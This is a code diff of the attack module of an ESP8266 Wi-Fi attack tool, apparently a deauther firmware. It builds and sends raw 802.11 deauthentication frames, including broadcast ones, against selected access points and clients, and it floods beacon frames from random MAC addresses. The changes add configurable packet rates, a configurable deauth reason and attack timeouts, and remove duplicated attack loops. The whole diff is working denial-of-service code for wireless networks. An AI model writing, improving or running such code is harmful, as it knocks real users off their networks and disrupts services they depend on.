@@ -2,6 +2,7 @@
 
 Attack::Attack(){
   randomSeed(os_random());
+  for(int i=0;i<attacksNum;i++) stati[i] = "ready";
 }
 
 void Attack::generate(){
@@ -14,9 +15,8 @@ void Attack::generate(){
   do{
     getRandomVendorMac(_randomMacBuffer);
     for(int i=0;i<6;i++) _randomBeaconMac.setAt(_randomMacBuffer[i],i);
-    if(debug) Serial.print(".");
   }while(beaconAdrs.add(_randomBeaconMac) >= 0);
-  if(debug) Serial.println("done ");
+  if(debug) Serial.println(" done");
 }
 
 void Attack::buildDeauth(Mac _ap, Mac _client, uint8_t type, uint8_t reason){
@@ -85,15 +85,14 @@ void Attack::buildBeacon(Mac _ap, Mac _client, String _ssid, int _ch, bool encry
 
 bool Attack::send(){
   if(wifi_send_pkt_freedom(packet, packetSize, 0) == -1){
-    /*if(debug){
-  delay(1); //less packets will be dropped
-  if(wifi_send_pkt_freedom(packet, packetSize, 0) == -1){
+    /*
     if(debug){
       Serial.print(packetSize);
       Serial.print(" : ");
       PrintHex8(packet, packetSize);
       Serial.println("");
-    }*/
+    }
+    */
     return false;
   }
   delay(1); //less packets are beeing dropped
@@ -102,11 +101,12 @@ bool Attack::send(){
 
 void Attack::run(){
   unsigned long currentMillis = millis();
-
+  
   /* =============== Deauth Attack =============== */
   if(isRunning[0] && currentMillis-prevTime[0] >= 1000){
     if(debug) Serial.print("running "+(String)attackNames[0]+" attack");
-
+    prevTime[0] = millis();
+    
     for(int a=0;a<apScan.results;a++){
       if(apScan.isSelected(a)){
         Mac _ap;
@@ -120,11 +120,11 @@ void Attack::run(){
           if(clientScan.getClientSelected(i)){
             _selectedClients++;
 
-            buildDeauth(_ap, clientScan.getClientMac(i), 0xc0, 0x01 );
-            for(int h=0;h<packetRate;h++) if(send()) packetsCounter[0]++;
+            buildDeauth(_ap, clientScan.getClientMac(i), 0xc0, settings.deauthReason );
+            for(int h=0;h<settings.attackPacketRate;h++) if(send()) packetsCounter[0]++;
             
-            buildDeauth(_ap, clientScan.getClientMac(i), 0xa0, 0x01 );
-            for(int h=0;h<packetRate;h++) if(send()) packetsCounter[0]++;
+            buildDeauth(_ap, clientScan.getClientMac(i), 0xa0, settings.deauthReason );
+            for(int h=0;h<settings.attackPacketRate;h++) if(send()) packetsCounter[0]++;
             
           }
         }
@@ -133,26 +133,27 @@ void Attack::run(){
           Mac _client;
           _client.set(0xFF,0xFF,0xFF,0xFF,0xFF,0xFF);
           buildDeauth(_ap, _client, 0xc0, 0x01 );
-          for(int h=0;h<packetRate;h++) if(send()) packetsCounter[0]++;
+          for(int h=0;h<settings.attackPacketRate;h++) if(send()) packetsCounter[0]++;
             
           buildDeauth(_ap, _client, 0xa0, 0x01 );
-          for(int h=0;h<packetRate;h++) if(send()) packetsCounter[0]++;
+          for(int h=0;h<settings.attackPacketRate;h++) if(send()) packetsCounter[0]++;
         }
         
       } 
     }
 
-    prevTime[0] = millis();
     stati[0] = (String)packetsCounter[0]+"pkts/s";
     packetsCounter[0] = 0;
-    if(debug) Serial.println(" done ");
+    attackTimeoutCounter[0]++;
+    if(debug) Serial.println(" done");
+    attackTimeoutCounter[0]++;
+    if(attackTimeoutCounter[0] > settings.attackTimeout) stop(1);
   }
 
   /* =============== Beacon Attack =============== */
   if(isRunning[1] && currentMillis-prevTime[1] >= 100){
     if(debug) Serial.print("running "+(String)attackNames[1]+" attack");
-
-    //int a = apScan.getFirstTarget();
+    prevTime[1] = millis();
     
     for(int a=0;a<apScan.results;a++){
       if(apScan.isSelected(a)){
@@ -208,70 +209,15 @@ void Attack::run(){
     stati[1] = (String)(packetsCounter[1]*10)+"pkts/s";
     packetsCounter[1] = 0;
     macListChangeCounter++;
-    if(macListChangeCounter*10 >= macListInterval){
+    if(macListChangeCounter/10 >= settings.attackMacInterval){
       generate();
       macListChangeCounter = 0;
     }
     if(debug) Serial.println(" done ");
-    prevTime[1] = millis();
+    attackTimeoutCounter[1]++;
+    if(attackTimeoutCounter[1]/10 > settings.attackTimeout) stop(1);
   }
-
-  if(isRunning[2] && currentMillis-prevTime[2] >= 1000){
-    if(debug) Serial.print("running "+(String)attackNames[1]+" attack");
-
-    prevTime[0] = millis();
-    stati[0] = (String)packetsCounter[0]+"pkts/s";
-    packetsCounter[0] = 0;
-    if(debug) Serial.println(" done ");
-  }
-
-  if(isRunning[1] && currentMillis-prevTime[1] >= 1000){
-    if(debug) Serial.print("running "+(String)attackNames[1]+" attack");
-
-    for(int a=0;a<apScan.results;a++){
-      if(apScan.isSelected(a)){
-        String _ssid = apScan.getAPName(a);
-        int _ch = apScan.getAPChannel(a);
-
-        wifi_set_channel(_ch);
-
-        int _selectedClients = 0;
-        for(int i=0;i<clientScan.results;i++){
-          if(clientScan.getClientSelected(i)){
-            _selectedClients++;
-
-            buildBeacon(beaconAdrs._get(0),clientScan.getClientMac(i),_ssid+" 2",_ch,false);
-            for(int h=0;h<packetRate;h++) if(send()) packetsCounter[1]++;
-            
-          }
-        }
-        
-        if(_selectedClients == 0){
-          Mac _client;
-          _client.set(0xFF,0xFF,0xFF,0xFF,0xFF,0xFF);
-
-          buildBeacon(beaconAdrs._get(0),_client,_ssid+" 2",_ch,false);
-          for(int h=0;h<packetRate;h++) if(send()) packetsCounter[1]++;
-
-        }
-        
-      } 
-    }
-    
-    prevTime[1] = millis();
-    stati[1] = (String)packetsCounter[1]+"pkts/s";
-    packetsCounter[1] = 0;
-    if(debug) Serial.println(" done ");
-  }
-
-  if(isRunning[2] && currentMillis-prevTime[2] >= 1000){
-    if(debug) Serial.print("running "+(String)attackNames[1]+" attack");
-
-    prevTime[1] = millis();
-    stati[1] = (String)packetsCounter[1]+"pkts/s";
-    packetsCounter[1] = 0;
-    if(debug) Serial.println(" done ");
-  }
+  
 }
 
 void Attack::start(int num){
@@ -279,21 +225,18 @@ void Attack::start(int num){
     isRunning[num] = true;
     stati[num] = "starting";
     prevTime[num] = millis();
+    attackTimeoutCounter[num] = 0;
     if(debug) Serial.println("starting "+(String)attackNames[num]+" attack");
   }else stop(num);
   
 }
 
 void Attack::stop(int num){
-  if(isRunning[num] && debug) Serial.println("stopping "+(String)attackNames[num]+" attack");
-  isRunning[num] = false;
-  stati[num] = "ready";
-  prevTime[num] = millis();
   if(isRunning[num]){
+    if(debug) Serial.println("stopping "+(String)attackNames[num]+" attack");
     isRunning[num] = false;
     stati[num] = "ready";
     prevTime[num] = millis();
-    if(debug) Serial.println("stopping "+(String)attackNames[num]+" attack");
   }
 }
 
